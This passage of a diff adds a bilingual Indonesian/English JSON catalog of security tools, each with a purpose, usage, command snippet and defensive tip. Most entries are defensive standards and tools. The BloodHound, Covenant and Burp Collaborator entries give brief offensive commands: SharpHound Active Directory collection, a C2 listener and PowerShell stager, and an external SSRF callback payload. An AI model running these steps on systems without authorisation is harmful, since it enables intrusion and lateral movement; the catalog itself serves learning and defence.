+   "en": "Blue teams use these rules to detect new malware variants that resemble older known samples."
+  },
+  "site": "https://virustotal.github.io/yara"
+ },
+ {
+  "name": "BloodHound",
+  "tier": "true_god",
+  "cat": "AD Attack Path Mapping",
+  "purpose": {
+   "id": "Memetakan hubungan izin di Active Directory untuk menemukan jalur tercepat menuju Domain Admin.",
+   "en": "Maps Active Directory permission relationships to find the shortest path to Domain Admin."
+  },
+  "use": {
+   "id": "Kumpulkan data dengan SharpHound, lalu impor ke BloodHound dan jalankan query 'Shortest Path'.",
+   "en": "Collect data with SharpHound, import it into BloodHound, then run a 'Shortest Path' query."
+  },
+  "cmd": "SharpHound.exe -c All\n// lalu import ke neo4j BloodHound",
+  "tip": {
+   "id": "Audit izin AD secara berkala menutup jalur eskalasi tak terduga sebelum penyerang menemukannya lebih dulu.",
+   "en": "Periodic AD permission audits close unexpected escalation paths before an attacker finds them first."
+  },
+  "site": "https://bloodhound.readthedocs.io"
+ },
+ {
+  "name": "Covenant",
+  "tier": "true_god",
+  "cat": ".NET C2 Framework",
+  "purpose": {
+   "id": "Framework command-and-control berbasis .NET untuk operasi red team di lingkungan Windows.",
+   "en": "A .NET-based command-and-control framework for red team operations in Windows environments."
+  },
+  "use": {
+   "id": "Buat Listener HTTP, hasilkan Launcher sebagai stager, lalu kendalikan Grunt yang terhubung.",
+   "en": "Create an HTTP Listener, generate a Launcher stager, then control the connected Grunt."
+  },
+  "cmd": "> Create Listener HTTP\n> Generate Launcher PowerShell",
+  "tip": {
+   "id": "Application allowlisting membatasi binary/script asing yang boleh berjalan, menutup banyak teknik stager seperti ini.",
+   "en": "Application allowlisting restricts which foreign binaries/scripts may run, closing off many stager techniques like this."
+  },
+  "site": "https://github.com/cobbr/Covenant"
+ },
+ {
+  "name": "Burp Collaborator",
+  "tier": "true_god",
+  "cat": "Out-of-Band Testing",
+  "purpose": {
+   "id": "Mendeteksi celah yang tidak terlihat langsung (blind) dengan memancing server target menghubungi server eksternal.",
+   "en": "Detects invisible (blind) vulnerabilities by tricking the target server into contacting an external server."
+  },
+  "use": {
+   "id": "Sisipkan subdomain unik Collaborator ke parameter yang dicurigai, lalu tunggu interaksi DNS/HTTP masuk.",
+   "en": "Insert a unique Collaborator subdomain into the suspected parameter, then wait for incoming DNS/HTTP interactions."
+  },
+  "cmd": "payload: http://abc123.oastify.com/ssrf-test",
+  "tip": {
+   "id": "Celah SSRF/blind injection sering tidak terlihat dari respons biasa — pemantauan koneksi keluar server itu penting.",
+   "en": "SSRF/blind injection flaws are often invisible in normal responses — monitoring a server's outbound connections matters."
+  },
+  "site": "https://portswigger.net/burp/documentation/collaborator"
+ },
+ {
+  "name": "Semgrep",
+  "tier": "true_god",
+  "cat": "Static Code Analysis (SAST)",
+  "purpose": {
+   "id": "Memindai kode sumber untuk pola berbahaya (SQLi, hardcoded secret, dll.) tanpa menjalankan programnya.",
+   "en": "Scans source code for dangerous patterns (SQLi, hardcoded secrets, etc.) without running the program."
+  },
+  "use": {
+   "id": "Jalankan terhadap repo dengan ruleset keamanan; hasilnya daftar baris kode yang perlu ditinjau.",
+   "en": "Run it against a repo with a security ruleset; it outputs a list of code lines to review."
+  },
+  "cmd": "semgrep --config p/owasp-top-ten src/",
+  "tip": {
+   "id": "Menjalankan SAST di setiap pull request menangkap celah sebelum kode sempat sampai ke produksi.",
+   "en": "Running SAST on every pull request catches flaws before the code ever reaches production."
+  },
+  "site": "https://semgrep.dev"
+ },
+ {
+  "name": "Suricata",
+  "tier": "true_god",
+  "cat": "Intrusion Detection (NIDS)",
+  "purpose": {
+   "id": "Memantau trafik jaringan secara real-time dan memberi peringatan saat pola serangan terdeteksi.",
+   "en": "Monitors network traffic in real time and alerts when attack patterns are detected."
+  },
+  "use": {
+   "id": "Muat ruleset (mis. ET Open), jalankan di antarmuka jaringan, lalu pantau log alert yang dihasilkan.",
+   "en": "Load a ruleset (e.g. ET Open), run it on a network interface, then monitor the generated alert log."
+  },
+  "cmd": "suricata -c suricata.yaml -i eth0",
+  "tip": {
+   "id": "IDS mendeteksi tapi tidak selalu memblokir — pasangkan dengan IPS/firewall untuk respons otomatis.",
+   "en": "An IDS detects but doesn't always block — pair it with an IPS/firewall for automatic response."
+  },
+  "site": "https://suricata.io"
+ },
+ {
+  "name": "OWASP ASVS",
+  "tier": "primordial_god",
+  "cat": "Security Verification Standard",
+  "purpose": {
+   "id": "Standar OWASP berisi daftar kontrol terverifikasi untuk merancang dan menguji keamanan aplikasi dari awal.",
+   "en": "OWASP's standard list of verifiable controls for designing and testing application security from the ground up."
+  },
+  "use": {
+   "id": "Pilih level (1-3) sesuai risiko aplikasi, lalu jadikan daftar kontrolnya acuan arsitektur keamanan sejak desain.",
+   "en": "Pick a level (1-3) matching the app's risk, then use its control list as the security architecture reference from the design stage."
+  },
+  "cmd": "// ASVS V2: Authentication  V4: Access Control  V5: Validation",
+  "tip": {
+   "id": "Merancang keamanan sejak hari pertama (secure by design) jauh lebih murah daripada menambalnya setelah insiden.",
+   "en": "Designing security from day one (secure by design) is far cheaper than patching it after an incident."
+  },
+  "site": "https://owasp.org/www-project-application-security-verification-standard"
+ },
+ {
+  "name": "OWASP Top 10",
+  "tier": "primordial_god",
+  "cat": "Risk Awareness Standard",
+  "purpose": {
+   "id": "Daftar 10 risiko keamanan aplikasi web paling kritis sebagai acuan prioritas pertahanan.",
+   "en": "A list of the 10 most critical web application security risks, used as a defense-priority reference."
+  },
+  "use": {
+   "id": "Jadikan checklist wajib saat code review dan desain arsitektur: tiap item dicek apakah sudah dimitigasi.",
+   "en": "Use it as a mandatory checklist during code review and architecture design, verifying each item is mitigated."
+  },
+  "cmd": "// A01 Broken Access Control  A02 Cryptographic Failures  A03 Injection",
+  "tip": {
+   "id": "Broken Access Control konsisten jadi risiko #1 — selalu verifikasi otorisasi di SETIAP endpoint, bukan cuma login.",
+   "en": "Broken Access Control consistently ranks #1 — always verify authorization on EVERY endpoint, not just at login."
+  },
+  "site": "https://owasp.org/www-project-top-ten"
+ },
+ {
+  "name": "Content Security Policy (CSP)",
+  "tier": "primordial_god",
+  "cat": "Browser Security Header",
+  "purpose": {
+   "id": "Header HTTP yang membatasi sumber mana saja yang boleh memuat script/style di sebuah halaman.",
+   "en": "An HTTP header that restricts which sources are allowed to load scripts/styles on a page."
+  },
+  "use": {
+   "id": "Tambahkan header ini di respons server dengan whitelist domain tepercaya untuk tiap jenis resource.",
+   "en": "Add this header to the server response with a whitelist of trusted domains for each resource type."
+  },
+  "cmd": "Content-Security-Policy: default-src 'self'; script-src 'self' trusted.cdn.com",
+  "tip": {
+   "id": "CSP yang benar adalah pertahanan berlapis terkuat melawan XSS, bahkan jika ada celah injeksi lolos.",
+   "en": "A properly set CSP is one of the strongest layered defenses against XSS, even if an injection flaw slips through."
+  },
+  "site": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+ },
+ {
+  "name": "OAuth 2.0 / OpenID Connect",
+  "tier": "primordial_god",
+  "cat": "Auth Protocol",
+  "purpose": {
+   "id": "Protokol standar untuk otorisasi delegasi (OAuth) dan autentikasi identitas (OIDC) antar aplikasi.",
+   "en": "The standard protocol for delegated authorization (OAuth) and identity authentication (OIDC) between apps."
+  },
+  "use": {
+   "id": "Gunakan Authorization Code flow dengan PKCE untuk aplikasi web/mobile, jangan Implicit flow yang sudah usang.",
+   "en": "Use the Authorization Code flow with PKCE for web/mobile apps, not the deprecated Implicit flow."
+  },
+  "cmd": "GET /authorize?response_type=code&client_id=app&code_challenge=xyz",
+  "tip": {
+   "id": "PKCE mencegah pencurian authorization code di aplikasi mobile/SPA yang tidak bisa menyimpan client secret dengan aman.",
+   "en": "PKCE prevents authorization-code theft in mobile/SPA apps that can't safely store a client secret."
+  },
+  "site": "https://oauth.net/2"
+ },
+ {
+  "name": "JSON Web Token (JWT)",
+  "tier": "primordial_god",
+  "cat": "Auth Token Standard",
+  "purpose": {
+   "id": "Standar token bertanda tangan untuk membawa klaim identitas antara pihak secara ringkas dan terverifikasi.",
+   "en": "A signed token standard for compactly carrying verifiable identity claims between parties."
+  },
+  "use": {
+   "id": "Server menandatangani token dengan secret/private key; selalu verifikasi tanda tangan sebelum memercayai isinya.",
+   "en": "The server signs the token with a secret/private key; always verify the signature before trusting its contents."
+  },
+  "cmd": "jwt.verify(token, secret, { algorithms: ['HS256'] })",
+  "tip": {
+   "id": "Jangan pernah menerima alg:'none' dari token yang masuk — itu celah klasik yang memalsukan tanda tangan.",
+   "en": "Never accept alg:'none' from an incoming token — it's a classic flaw that forges the signature."
+  },
+  "site": "https://jwt.io"
+ },
+ {
+  "name": "HSTS",
+  "tier": "primordial_god",
+  "cat": "Transport Security Header",
+  "purpose": {
+   "id": "Header yang memaksa browser selalu memakai HTTPS ke domain ini, mencegah downgrade ke HTTP.",
+   "en": "A header that forces browsers to always use HTTPS for this domain, preventing downgrade to HTTP."
+  },
+  "use": {
+   "id": "Tambahkan header ini di respons HTTPS dengan max-age cukup panjang agar perlindungan bertahan lama.",
+   "en": "Add this header to the HTTPS response with a sufficiently long max-age so the protection persists."
+  },
+  "cmd": "Strict-Transport-Security: max-age=63072000; includeSubDomains",
+  "tip": {
+   "id": "Tanpa HSTS, serangan downgrade bisa memaksa korban kembali ke HTTP yang tidak terenkripsi.",
+   "en": "Without HSTS, a downgrade attack can force a victim back onto unencrypted HTTP."
+  },
+  "site": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"
+ },
+ {
+  "name": "Web Application Firewall (WAF)",
+  "tier": "primordial_god",
+  "cat": "Perimeter Defense",
+  "purpose": {
+   "id": "Lapisan filter di depan aplikasi web yang memblokir pola serangan umum (SQLi, XSS) sebelum sampai ke server.",
+   "en": "A filtering layer in front of a web app that blocks common attack patterns (SQLi, XSS) before they reach the server."
+  },
+  "use": {
+   "id": "Pasang di depan aplikasi (mis. Cloudflare/ModSecurity), aktifkan ruleset OWASP Core Rule Set, lalu pantau false positive.",
+   "en": "Deploy it in front of the app (e.g. Cloudflare/ModSecurity), enable the OWASP Core Rule Set, then monitor false positives."
+  },
+  "cmd": "SecRule ARGS \"@detectSQLi\" \"id:1001,deny,status:403\"",
+  "tip": {
+   "id": "WAF adalah lapisan tambahan, bukan pengganti validasi input yang benar di kode aplikasinya sendiri.",
+   "en": "A WAF is an extra layer, not a replacement for proper input validation in the application code itself."
+  },
+  "site": "https://owasp.org/www-project-modsecurity-core-rule-set"
+ },
+ {
+  "name": "SIEM (Splunk/ELK)",
+  "tier": "primordial_god",
+  "cat": "Security Monitoring",
+  "purpose": {
+   "id": "Mengumpulkan dan mengorelasikan log dari seluruh sistem untuk mendeteksi insiden keamanan secara terpusat.",
+   "en": "Collects and correlates logs from every system to detect security incidents from a central place."
+  },
+  "use": {
+   "id": "Kirim log dari semua servis ke SIEM, buat aturan korelasi (mis. 5x login gagal), lalu atur alert otomatis.",
+   "en": "Forward logs from every service into the SIEM, write correlation rules (e.g. 5 failed logins), then set automatic alerts."
+  },
+  "cmd": "index=auth action=failure | stats count by user | where count > 5",
+  "tip": {
+   "id": "Tanpa logging terpusat, sebuah insiden bisa terjadi berbulan-bulan tanpa pernah terdeteksi oleh siapa pun.",
+   "en": "Without centralized logging, an incident can go undetected by anyone for months."
+  },
+  "site": "https://www.splunk.com"
+ },
+ {
+  "name": "Zero Trust Architecture",
+  "tier": "primordial_god",
+  "cat": "Security Model",
+  "purpose": {
+   "id": "Model keamanan yang tidak pernah mempercayai siapa pun secara default, bahkan dari dalam jaringan sendiri.",
+   "en": "A security model that never trusts anyone by default, even requests originating inside the network."
+  },
+  "use": {
+   "id": "Verifikasi identitas dan izin di SETIAP request (bukan cuma gerbang masuk), lakukan segmentasi mikro di jaringan.",
+   "en": "Verify identity and authorization on EVERY request (not just at the gate), and micro-segment the network."
+  },
+  "cmd": "// Prinsip: \"never trust, always verify\" di setiap permintaan",
+  "tip": {
+   "id": "Begitu penyerang masuk satu titik di jaringan tradisional, mereka sering bebas bergerak — Zero Trust menutup itu.",
+   "en": "Once an attacker breaches one point in a traditional network they often roam freely — Zero Trust closes that gap."
+  },
+  "site": "https://www.nist.gov/publications/zero-trust-architecture"
+ },
+ {
+  "name": "Argon2id",
+  "tier": "primordial_god",
+  "cat": "Password Hashing Standard",
+  "purpose": {
+   "id": "Algoritma hashing password pemenang Password Hashing Competition, dirancang tahan GPU/ASIC cracking.",
+   "en": "The Password Hashing Competition-winning algorithm, designed to resist GPU/ASIC cracking."
+  },
+  "use": {
+   "id": "Set parameter memory cost, time cost, dan paralelisme sesuai rekomendasi OWASP sebelum menyimpan hash.",
+   "en": "Set the memory cost, time cost, and parallelism parameters per OWASP recommendations before storing the hash."
+  },
+  "cmd": "argon2.hash(password, { type: argon2id, memoryCost: 19456 })",
+  "tip": {
+   "id": "Kebutuhan memori besar Argon2id membuat cracking massal di GPU jauh lebih mahal dibanding bcrypt sekalipun.",
+   "en": "Argon2id's high memory requirement makes mass GPU cracking far more expensive even compared to bcrypt."
+  },
+  "site": "https://github.com/P-H-C/phc-winner-argon2"
+ },
+ {
+  "name": "HashiCorp Vault",
+  "tier": "primordial_god",
+  "cat": "Secrets Management",
+  "purpose": {
+   "id": "Menyimpan, mengenkripsi, dan mengatur akses ke secret (API key, password DB) secara terpusat dan terotorisasi.",
+   "en": "Centrally stores, encrypts, and governs access to secrets (API keys, DB passwords) with proper authorization."
+  },
+  "use": {
+   "id": "Simpan secret di Vault, bukan di kode atau file .env; aplikasi mengambilnya saat runtime lewat token sementara.",
+   "en": "Store secrets in Vault instead of in code or .env files; apps fetch them at runtime via a short-lived token."
+  },
+  "cmd": "vault kv put secret/db password=\"s3cr3t\"",
+  "tip": {
+   "id": "Secret yang pernah ter-commit ke Git tetap ada di riwayatnya selamanya — selalu rotasi kalau sudah pernah bocor.",
+   "en": "A secret once committed to Git stays in its history forever — always rotate it once it has ever leaked."
+  },
+  "site": "https://www.vaultproject.io"
+ },
+ {
+  "name": "mTLS (Mutual TLS)",
+  "tier": "primordial_god",
+  "cat": "Service-to-Service Auth",
+  "purpose": {
+   "id": "Kedua pihak (klien dan server) saling memverifikasi sertifikat, bukan cuma server ke klien seperti TLS biasa.",
+   "en": "Both sides (client and server) verify each other's certificates, unlike regular TLS where only the client verifies the server."
+  },
+  "use": {
+   "id": "Terbitkan sertifikat untuk tiap servis internal, lalu wajibkan verifikasi sertifikat klien di setiap koneksi antar servis.",
+   "en": "Issue a certificate for each internal service, then require client certificate verification on every service-to-service connection."
+  },
+  "cmd": "ssl_verify_client on;\nssl_client_certificate ca.pem;",
+  "tip": {
+   "id": "Di arsitektur microservice, mTLS mencegah servis palsu menyamar sebagai servis internal yang sah.",
+   "en": "In a microservice architecture, mTLS prevents a rogue service from impersonating a legitimate internal one."
+  },
+  "site": "https://www.cloudflare.com/learning/access-management/what-is-mutual-tls"
+ },
+ {
+  "name": "STRIDE Threat Modeling",
+  "tier": "primordial_god",
+  "cat": "Security Design Method",
+  "purpose": {
+   "id": "Metode merancang keamanan di tahap desain dengan mengenali 6 kategori ancaman sebelum kode ditulis.",
+   "en": "A design-stage security method that identifies 6 threat categories before any code is written."
+  },
+  "use": {
+   "id": "Gambar diagram arsitektur, lalu untuk tiap komponen tanyakan: bisakah ia Spoofed, Tampered, Repudiated, dst.",
+   "en": "Draw the architecture diagram, then for each component ask: can it be Spoofed, Tampered, Repudiated, etc."
+  },
+  "cmd": "// S-T-R-I-D-E: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege",
+  "tip": {
+   "id": "Menemukan ancaman di atas kertas (desain) jauh lebih murah daripada menemukannya lewat insiden produksi.",
+   "en": "Finding threats on paper (at design time) is far cheaper than finding them through a production incident."
+  },
+  "site": "https://owasp.org/www-community/Threat_Modeling_Process"
+ }
+]
